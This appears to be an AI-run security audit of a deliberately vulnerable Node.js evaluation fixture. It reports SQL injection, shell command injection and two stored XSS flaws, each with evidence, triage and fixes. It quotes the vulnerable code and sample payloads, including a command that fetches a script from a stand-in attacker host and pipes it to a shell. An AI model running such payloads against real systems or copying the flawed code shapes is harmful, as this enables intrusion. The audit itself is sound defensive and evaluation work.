# Security Audit — `gaps4-vuln-app`

- **Date:** 2026-09-25 (blind round `2026-09-25-gaps4-blind`)
- **Target:** `/tmp/sas-fp/evals/fixtures/gaps4-vuln-app`
- **Method:** `injection-flaws` skill (`/tmp/sas-fp/skills/injection-flaws/SKILL.md`) — sink greps per category → backward source tracing → triage with falsifiers before reporting.
- **Blind-eval hygiene:** `expected-findings.md` was NEVER opened and was excluded (`--glob '!**/expected-findings.md'`) from every recursive scan. Scanned corpus (confirmed via `rg --files` + `find`): `app.js`, `safe-gaps4.js`, `triage-gaps4.js`.
- **Audit mode:** read-only. No fixture file was modified.
- Note: the fixture self-describes as a drill with fake data; per instructions, planted-looking shapes are reported as real findings.

## Stack summary

Small Node.js (CommonJS) module mixing an **Express server excerpt** and a **browser-bundle excerpt** in one file. Referenced dependencies: `express`, `child_process.spawn`, `dompurify` (only in the triage counterpart file). Data layer is a mysql-style connection pool (`pool.query`). No `package.json`/lockfile, no route or middleware wiring, no templates, no XML parsing, no file uploads, no IaC/network manifests. 3 JS files, ~56 LOC.

---

### SEC-001 — SQL injection via split-construction query (`findOrder`)

- **Severity:** Critical (SQLi class; handler takes `req` directly — no auth middleware anywhere in the fixture)
- **Where:** `app.js:26–28` (sink at `app.js:28`)
- **Evidence:**
  ```js
  26 function findOrder(req, pool) {
  27   const base = 'SELECT * FROM orders WHERE ref = ';
  28   return pool.query(base + req.params.ref);
  ```
- **Source → sink:** `req.params.ref` (HTTP route parameter) is string-concatenated onto a SQL literal and passed to `pool.query` as a single statement string.
- **Falsifier (near-miss conditions ruled out):**
  1. *Parameterized?* No — no `?` placeholder or values array at `app.js:28`; the genuinely parameterized safe shape exists at `safe-gaps4.js:5` (`pool.query('SELECT ... ref = ?', [req.params.ref])`) and was NOT used here.
  2. *Constant-only SQL?* No — the appended operand is `req.params.ref`, request data.
  3. *test/example/migration placement?* No — live app code, exported at `app.js:39`.
  4. *Comment-text mention?* No — the hit at `app.js:28` is executable code (the comments at `app.js:23–25` merely describe the pattern and were dispositioned as documentation).
  5. Notably, the skill's single-line SQL grep (SQL-1) returned **0 hits** because the SELECT literal (`app.js:27`) and the taint (`app.js:28`) are on different lines; only the call-site grep `(query|execute)\(\s*\w+\s*\+` caught it — the documented split-construction blind spot.
- **Impact:** Arbitrary SQL injection — attacker-controlled `ref` (`' OR '1'='1' --`, UNION SELECT, driver-permitting stacked statements) reads/modifies the `orders` table and can pivot to other tables.
- **Fix:** `pool.query('SELECT * FROM orders WHERE ref = ?', [req.params.ref])` (mirror `safe-gaps4.js:5`); optionally also validate `ref` against `^[A-Za-z0-9-]+$`.

### SEC-002 — OS command injection: `spawn(..., { shell: true })` re-parses the argument array (`gitLog`)

- **Severity:** Critical (command-injection class; no auth middleware in fixture)
- **Where:** `app.js:34–35` (sink at `app.js:35`)
- **Evidence:**
  ```js
  34 function gitLog(userBranch) {
  35   const child = spawn('git', ['log', '--oneline', userBranch], { shell: true });
  ```
- **Source → sink:** `userBranch` (user-supplied branch name) placed in the argument array, but `{ shell: true }` routes the invocation through `/bin/sh -c`, so shell metacharacters in `userBranch` are re-parsed and executed.
- **Falsifier (near-miss conditions ruled out):**
  1. *"Argument array = safe"?* Ruled out — the skill explicitly documents `spawn(cmd, [args], { shell: true })` as **NOT** the safe shape: the shell re-parses the array. `{ shell: true }` is present at `app.js:35`.
  2. *Comment-text mention?* Ruled out — `app.js:31–33` is a describing comment; the grep hit is live code at `app.js:35`.
  3. *Safe counterpart shape?* Confirmed not used — `execFile('git', [...])` without shell exists at `safe-gaps4.js:15`, showing the safe form was available and deliberately not chosen.
- **Impact:** Arbitrary command execution as the Node process user (RCE), e.g. branch value `main; curl http://attacker/x.sh | sh`.
- **Fix:** Use `execFile('git', ['log', '--oneline', branch])` without a shell (mirror `safe-gaps4.js:15`) and/or allowlist the branch (`^[A-Za-z0-9._/-]+$`).

### SEC-003 — Stored XSS: unsanitized comment body into `insertAdjacentHTML` (`renderFeed`)

- **Severity:** High (escalates to **Critical** if this feed is rendered in any staff/moderation surface — privilege direction not determinable from the fixture)
- **Where:** `app.js:12–14` (sink at `app.js:14`)
- **Evidence:**
  ```js
  12 function renderFeed(comment) {
  13   const feed = document.getElementById('feed');
  14   feed.insertAdjacentHTML('beforeend', comment.body);
  ```
- **Source → sink:** `comment.body` — a model/DB field (second-order stored flow: authored at comment time, parsed as HTML at render time) — into `insertAdjacentHTML`, an HTML-parsing DOM sink.
- **Falsifier (near-miss conditions ruled out, per the skill's fires-but-safe list):**
  1. *DOMPurify-sanitized?* No sanitizer anywhere on this path (the sanitized shape lives at `triage-gaps4.js:10`).
  2. *Clearing assignment?* No — the `innerHTML = ''` shape is `triage-gaps4.js:14`.
  3. *Code-owned constant?* No — `comment.body` is a runtime model field (the constant shape is `triage-gaps4.js:17,20`).
  4. *Comment-text mention?* No — the XSS-grep hits on `app.js:10–11` are documentation comments (dispositioned as noise); `app.js:14` is executable code.
  5. *Read path checked* per the skill's second-order rule: the model field is rendered raw; no encoder exists on the render path.
- **Impact:** Stored script execution in every viewer's session (cookie/session theft, victim-impersonating actions). Comments are unprivileged-authored; per the skill's privilege-direction table, a staff/moderation viewer would make this Critical.
- **Fix:** `feed.textContent = comment.body` (mirror `safe-gaps4.js:10`) or `insertAdjacentHTML('beforeend', DOMPurify.sanitize(comment.body))`.

### SEC-004 — Stored XSS: profile bio assigned to `outerHTML` (`renderBio`)

- **Severity:** High (same privilege-direction caveat as SEC-003)
- **Where:** `app.js:17–19` (sink at `app.js:19`)
- **Evidence:**
  ```js
  17 function renderBio(user) {
  18   const bioEl = document.getElementById('bio');
  19   bioEl.outerHTML = user.profile.bio;
  ```
- **Source → sink:** `user.profile.bio` (user-authored, stored profile field) assigned to `outerHTML`, which parses the string as HTML and replaces the element — injected event-handler attributes (e.g. `<img src=x onerror=...>`) execute without needing a `<script>` tag.
- **Falsifier (near-miss conditions ruled out):** same battery as SEC-003, all ruled out at this site — no DOMPurify on the path (contrast `triage-gaps4.js:10`); not clearing (`triage-gaps4.js:14`); not a constant (`user.profile.bio` is runtime data; constant shape `triage-gaps4.js:20`); live code, not comment text.
- **Impact:** Stored XSS against every viewer of the profile → session/account takeover.
- **Fix:** `bioEl.textContent = user.profile.bio`, or sanitize with DOMPurify before assignment.

---

## Verified-safe dispositions (triage receipts)

| Site | Shape | Disposition |
|---|---|---|
| `triage-gaps4.js:10` | `feed.innerHTML = DOMPurify.sanitize(post.content)` | SAFE — skill-listed sanitized form. Residual note per "sanitizer ≠ safe by default": DOMPurify version/bypass resistance unverifiable (no `package.json`) — keep it current. |
| `triage-gaps4.js:14` | `document.getElementById('feed').innerHTML = ''` | SAFE — clearing assignment. |
| `triage-gaps4.js:20` | `...innerHTML = VERIFIED_BADGE_SVG` (module constant, `triage-gaps4.js:17`) | SAFE — code-owned constant. |
| `safe-gaps4.js:5` | `pool.query('SELECT ... ref = ?', [req.params.ref])` | SAFE — parameterized binding; the value never joins the SQL text. |
| `safe-gaps4.js:10` | `el.textContent = comment.body` | SAFE — `textContent` is not an HTML-parsing sink. |
| `safe-gaps4.js:15` | `execFile('git', [...], cb)` | SAFE — argument-array exec, no shell. |

## Census receipts

All scans run in the fixture root with `--glob '!**/expected-findings.md'`. "hits" counts matching lines.

| # | Grep (skill category) | hits | dispositioned | outcome |
|---|---|---|---|---|
| SQL-1 | single-line SELECT+marker | 0 | 0 | no hits — demonstrates the split-construction blind spot exploited by SEC-001 |
| SQL-2 | call-site `(query\|execute)\(\s*\w+\s*\+` | 1 | 1 | **SEC-001** (`app.js:28`); `safe-gaps4.js:5` correctly not matched |
| SQL-3 | NoSQL `$where`/`$expr`/`mapReduce` | 0 | 0 | — |
| SQL-4 | NoSQL operator injection | 0 | 0 | — |
| SQL-5 | query-builder raw APIs | 0 | 0 | — |
| SQL-6 | multiline triple-quote build | 0 | 0 | — |
| CMD | os-command battery (incl. `spawn\([^)]*shell:\s*true`) | 1 | 1 | **SEC-002** (`app.js:35`) |
| XSS-1 | HTML sink battery | 7 | 7 | **SEC-003** (`app.js:14`), **SEC-004** (`app.js:19`); 3 verified-safe (`triage-gaps4.js:10,14,20`); 2 comment-text noise (`app.js:10,11`) |
| XSS-2 | reflected (`res.send`/`<%=`) | 0 | 0 | — |
| PATH | file-open battery | 1 | 1 | noise — substring artifact: `File\(` matching inside `execFile(` at `safe-gaps4.js:15`; no user-influenced path anywhere |
| SSRF-1 | fetch/axios/http sinks | 0 | 0 | — |
| SSRF-2 | stored webhook/callback URLs | 0 | 0 | — |
| DESER | unsafe deserialize/eval/Function | 0 | 0 | one invocation failed to parse (rg build lacks PCRE2 lookaround); re-ran with the `yaml.load` lookahead branch dropped — `yaml` absent from corpus, so equivalent coverage |
| CRLF | header injection | 0 | 0 | — |
| UNI-1/2 | normalization / comparison hygiene | 0 | 0 | — |
| SSTI | template-string construction | 0 | 0 | — |
| PROTO-1/2/3 | pollution keys / merges / deep parsers | 0 | 0 | — |
| XXE | XML parser battery | 0 | 0 | — |
| REDOS-1/2 | nested quantifiers / regex call sites | 0 | 0 | — |
| REDIR-1/2 | redirect sinks / `?next=`-style params | 0 | 0 | — |
| UPLOAD | upload/multipart battery | 0 | 0 | — |
| EGRESS | `http_tokens`/`metadata_options`/NetworkPolicy | 0 | 0 | no `.tf/.yaml/.json` files in corpus |
| **TOTAL** | | **10** | **10** | **4 findings · 3 verified-safe · 3 noise** |

## Not assessed

- `expected-findings.md` — never opened; excluded from every scan (blind-eval hygiene). Its existence is known only from directory listing; `triage-gaps4.js:4`'s comment references it, but only that comment text was read, not the file.
- **Reachability / auth posture** — the fixture contains no route wiring or middleware; severities for SEC-001/002 assume the exported handlers are reachable (findOrder receives `req`; gitLog's param is user-named). Confirm exposure before exploitability claims.
- **Dependency versions** — no `package.json`/lockfile; DOMPurify version (bypass-resistance per skill's GHSL-2026-072 guidance) and express/rg versions not verifiable.
- **Egress/network hardening** — N/A: no SSRF sinks and no IaC/network manifests to inspect.
- Categories with zero sink presence (file writes/uploads, XML, templates, mail, redirects) — nothing to assess.
